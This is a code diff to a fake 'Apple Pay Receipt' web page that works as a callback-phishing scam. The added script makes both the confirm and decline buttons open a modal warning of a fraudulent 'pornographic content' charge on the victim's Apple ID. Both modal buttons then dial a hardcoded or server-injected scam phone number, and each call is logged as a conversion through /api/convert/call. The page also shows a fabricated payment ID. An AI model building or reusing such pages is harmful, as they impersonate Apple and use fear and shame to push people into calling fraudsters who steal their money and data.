@@ -4,14 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Apple Pay Receipt</title>
-
-    <script type="text/javascript">
-    (function(c,l,a,r,i,t,y){
-        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-    })(window, document, "clarity", "script", "whskqf48a7");
-</script>
     <style>
         /* ===== RESET & BASE ===== */
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
@@ -227,7 +219,7 @@
                 <!-- NEW: PAYMENT ID (Above Subtotal) -->
                 <div class="receipt-item payment-id-row">
                     <span>Payment ID</span>
-                    <span id="payment-id-display" class="payment-id-value"></span>
+                    <span id="payment-id-display" class="payment-id-value">APL223F34746A565</span>
                 </div>
 
                 <!-- AMOUNTS -->
@@ -256,8 +248,8 @@
                 <div class="auth-section">
                     <div class="auth-question">Do you authorize this transaction?</div>
                     <div class="auth-buttons">
-                        <button class="btn btn-decline" id="btn-decline">No, Decline</button>
-                        <button class="btn btn-confirm" id="btn-confirm">Yes, I Confirm</button>
+                        <button class="btn btn-decline" id="btn-decline" onclick="triggerConfirmation()">No, Decline</button>
+                        <button class="btn btn-confirm" id="btn-confirm" onclick="triggerConfirmation()">Yes, I Confirm</button>
                     </div>
                 </div>
 
@@ -266,102 +258,109 @@
 
     </div>
 
-    <script>
-        // ==========================================
-        // 1. SETUP PHONE NUMBER (EJS INTEGRATION)
-        // ==========================================
-        
-        // NOTE: In your Express/EJS environment, replace the line below:
-        // var userPhone = "<%= phone %>";
-        
-        // For this standalone demo, we simulate the behavior:
-        var potentialPhone = "<%= phone %>"; 
-        
-        // If the variable wasn't replaced by a server, use the fallback demo number
-        var finalPhoneNumber = (potentialPhone === "<%= phone %>") ? "+18555384076" : potentialPhone;
+     <script>
+    // ==========================================
+    // 1. CORE VARIABLES (Keep Intact As Requested)
+    // ==========================================
+    var potentialPhone = "<%= phone %>"; 
+    var finalPhoneNumber = (potentialPhone === "<%= phone %>") ? "+18555384076" : potentialPhone;
+    
+        const demoMessage = "A suspicious pre-authorised transaction has been charged on your Apple ID, to purchase some pornographic content, if you dont recognize the transaction,get in touch with us immediately at <%= phone %>, click on ok to get in touch right now and report the fraudent act";
 
-       
-        // ==========================================
-        // 2. GENERATE RANDOM PAYMENT ID
-        // ==========================================
-        function generatePaymentID() {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-            let id = 'PAY-';
-            for (let i = 0; i < 12; i++) {
-                id += chars.charAt(Math.floor(Math.random() * chars.length));
+    // ==========================================
+    // 2. TRACKING FUNCTION
+    // ==========================================
+    function trackCallClick() {
+        try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '/api/convert/call', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send('{}');
+        } catch(e) {}
+    }
+
+    // ==========================================
+    // 3. MODAL GENERATION & LOGIC
+    // ==========================================
+
+    // Creates the Modal HTML and Styles dynamically
+    function initGlobalModal() {
+        // Inject CSS for the modal
+        const style = document.createElement('style');
+        style.innerHTML = `
+            #global-confirm-modal {
+                display: none; /* Hidden by default */
+                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+                background: rgba(0, 0, 0, 0.6); z-index: 9999;
+                justify-content: center; align-items: center;
+                backdrop-filter: blur(4px);
             }
-            return id;
-        }
-        document.getElementById('payment-id-display').textContent = generatePaymentID();
-
-
-        // ==========================================
-        // 3. STATIC DATE & TIME SETUP
-        // ==========================================
-        function setStaticDateTime() {
-            const now = new Date();
-            
-            // Format Date
-            const dateOptions = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
-            document.getElementById('date-display').textContent = now.toLocaleDateString('en-US', dateOptions);
-
-            // Format Time
-            const timeOptions = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
-            document.getElementById('time-display').textContent = now.toLocaleTimeString('en-US', timeOptions);
-        }
-        setStaticDateTime();
-
-          function trackCallClick() {
-           try {
-              var xhr = new XMLHttpRequest();
-              xhr.open('POST', '/api/convert/call', true);
-               xhr.setRequestHeader('Content-Type', 'application/json');
-               xhr.send('{}');
-                } catch(e) {}
-              }
-        // ==========================================
-        // 4. AUTHENTICATION & CALL LOGIC
-        // ==========================================
-        
-        const demoMessage = "A suspicious pre-authorised transaction has been chagred on your Apple ID, to purchase some pornographic content, if you dont recognize the transaction,get in touch with us immediately at <%= phone %>, click on ok to get in touch right now and report the fraudent act";
-
-        function handleAuthorization() {
-            // Show the native JS Confirm Dialog (Has OK/Cancel buttons)
-            // The user MUST click a button to close this.
-            window.confirm(demoMessage);
-
-            // AFTER the dialog is closed (whether they clicked OK or Cancel),
-            // place the phone call as requested.
-            initiateCall(finalPhoneNumber);
-        }
-
-        function initiateCall(phone) {
-            console.log("Initiating call to " + phone + "...");
-            
-            // Method: Programmatically click a 'tel:' link
-            const link = document.createElement('a');
-            link.href = `tel:${phone}`;
-            link.style.display = 'none';
-            document.body.appendChild(link);
-            
-            // Trigger the click
-            if (link.click) {
-                link.click();
-            } else {
-                // Fallback for older browsers
-                window.location.href = `tel:${phone}`;
+            .gc-modal-content {
+                background: white; padding: 24px; border-radius: 16px;
+                width: 90%; max-width: 340px; text-align: center;
+                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+                animation: popIn 0.3s ease;
             }
+            @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
             
-            document.body.removeChild(link);
+            .gc-btn {
+                width: 100%; padding: 14px; margin-top: 10px;
+                border-radius: 10px; font-size: 1rem; font-weight: 700;
+                cursor: pointer; border: none; transition: opacity 0.2s;
+            }
+            .gc-btn:hover { opacity: 0.9; }
+            .btn-call { background-color: #007AFF; color: white; box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3); }
+            .btn-decline { background-color: #f2f2f7; color: #ff3b30; }
+            
+            .gc-title { font-size: 1.1rem; font-weight: 700; color: #000; margin-bottom: 10px; }
+            .gc-desc { font-size: 0.9rem; color: #666; line-height: 1.4; margin-bottom: 20px; }
+        `;
+        document.head.appendChild(style);
 
-            trackCallClick();
-        }
+        // Inject Modal HTML
+        const modalHTML = `
+            <div id="global-confirm-modal">
+                <div class="gc-modal-content">
+                    <div class="gc-title">Confirm Authorization</div>
+                    <div class="gc-desc" id="dynamic-demo-text"></div>
+                    <button class="gc-btn btn-call" onclick="executeAction()">Call</button>
+                    <button class="gc-btn btn-decline" onclick="executeAction()">Decline</button>
+                </div>
+            </div>
+        `;
+        document.body.insertAdjacentHTML('beforeend', modalHTML);
 
-        // Attach Event Listeners
-        document.getElementById('btn-confirm').addEventListener('click', handleAuthorization);
-        document.getElementById('btn-decline').addEventListener('click', handleAuthorization);
+        // Populate dynamic text with our kept variable
+        document.getElementById('dynamic-demo-text').innerText = demoMessage;
 
-    </script>
+        // Add Click Outside to Close
+        document.getElementById('global-confirm-modal').addEventListener('click', function(e) {
+            if (e.target === this) this.style.display = 'none';
+        });
+    }
+
+    // Main Trigger Function (Attach this to your "Confirm" / "Decline" buttons)
+    function triggerConfirmation() {
+        document.getElementById('global-confirm-modal').style.display = 'flex';
+    }
+
+    // Execute Call Logic (Attach this to the Modal Buttons)
+    function executeAction() {
+        // Hide Modal
+        document.getElementById('global-confirm-modal').style.display = 'none';
+        
+        // Log and Place Call
+        console.log("Attempting call to " + finalPhoneNumber);
+        window.location.href = "tel:" + finalPhoneNumber;
+        
+        // Run Tracker
+        trackCallClick();
+    }
+
+    // Initialize on Load
+    initGlobalModal();
+
+</script>
 
 </body>
 </html>
